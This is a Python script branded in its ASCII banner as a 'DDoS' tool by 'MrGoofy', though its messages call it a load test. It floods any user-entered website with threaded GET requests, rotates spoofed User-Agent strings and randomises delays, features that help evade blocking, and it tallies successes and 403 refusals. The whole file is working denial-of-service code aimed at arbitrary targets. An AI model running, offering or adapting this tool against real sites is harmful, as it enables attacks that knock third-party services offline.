import requests
import concurrent.futures
import time
import random
import logging
import os
from itertools import cycle

MIN_DELAY = 0.1   # seconds
MAX_DELAY = 1.0   # seconds

def show_banner():
    # Clear terminal before showing banner
    os.system("cls" if os.name == "nt" else "clear")
    banner = r"""
 ███████████ █████ █████    ██████████   ██████████             █████████ 
░█░░░░░░███ ░░███ ░░███    ░░███░░░░███ ░░███░░░░███           ███░░░░░███
░     ███░   ░░███ ███      ░███   ░░███ ░███   ░░███  ██████ ░███    ░░░ 
     ███      ░░█████       ░███    ░███ ░███    ░███ ███░░███░░█████████ 
    ███        ███░███      ░███    ░███ ░███    ░███░███ ░███ ░░░░░░░░███
  ████     █  ███ ░░███     ░███    ███  ░███    ███ ░███ ░███ ███    ░███
 ███████████ █████ █████    ██████████   ██████████  ░░██████ ░░█████████ 
░░░░░░░░░░░ ░░░░░ ░░░░░    ░░░░░░░░░░   ░░░░░░░░░░    ░░░░░░   ░░░░░░░░░      

                                                             By MrGoofy
    """
    print(banner)

def load_user_agents(filename="user-agent.txt"):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            agents = [line.strip() for line in f if line.strip()]
        if not agents:
            raise ValueError("User-agent list is empty!")
        return agents
    except Exception as e:
        print(f"Error loading user agents: {e}")
        return ["Mozilla/5.0 (default UA)"]

def send_request(url, req_id, ua_cycle):
    delay = random.uniform(MIN_DELAY, MAX_DELAY)
    time.sleep(delay)

    headers = {"User-Agent": next(ua_cycle)}
    start = time.time()
    try:
        response = requests.get(url, headers=headers, timeout=10)
        elapsed = time.time() - start

        if response.status_code == 200:
            msg = (f"[Request {req_id}] ✅ Success ({response.status_code}) | "
                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent']}")
        elif response.status_code == 403:
            msg = (f"[Request {req_id}] 🚫 Forbidden (403) | "
                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent']}")
        else:
            msg = (f"[Request {req_id}] ⚠️ Failed ({response.status_code}) | "
                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent']}")
        print(msg)
        logging.info(msg)
        return response.status_code
    except Exception as e:
        elapsed = time.time() - start
        msg = f"[Request {req_id}] ❌ Error: {e} | Delay: {delay:.3f}s | RT: {elapsed:.3f}s"
        print(msg)
        logging.error(msg)
        return None

def main():
    show_banner()  

    domain = input("Enter website domain (e.g. https://example.com): ").strip()
    try:
        total_requests = int(input("Enter number of requests: "))
        workers = int(input("Enter number of workers (parallel threads): "))
    except ValueError:
        print("❌ Invalid input! Please enter integers for requests and workers.")
        return

    if total_requests <= 0 or workers <= 0:
        print("❌ Requests and workers must be positive integers!")
        return

    logging.basicConfig(filename="load_test.log", level=logging.INFO,
                        format="%(asctime)s - %(levelname)s - %(message)s")

    user_agents = load_user_agents("user-agent.txt")
    ua_cycle = cycle(user_agents)

    print(f"\nStarting load test on {domain} with {total_requests} requests using {workers} workers...")
    print(f"Random delay per request: {MIN_DELAY}–{MAX_DELAY} seconds\n")
    start_time = time.time()

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(send_request, domain, i+1, ua_cycle) for i in range(total_requests)]
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())

    end_time = time.time()
    print("\n--- Load Test Summary ---")
    print(f"Total requests sent: {len(results)}")
    print(f"Successful responses: {results.count(200)}")
    print(f"403 Forbidden responses: {results.count(403)}")
    print(f"Other errors: {len([r for r in results if r not in (200, 403) and r is not None])}")
    print(f"Total time: {end_time - start_time:.2f} seconds")
    print("Logs saved to: load_test.log")

if __name__ == "__main__":
    main()
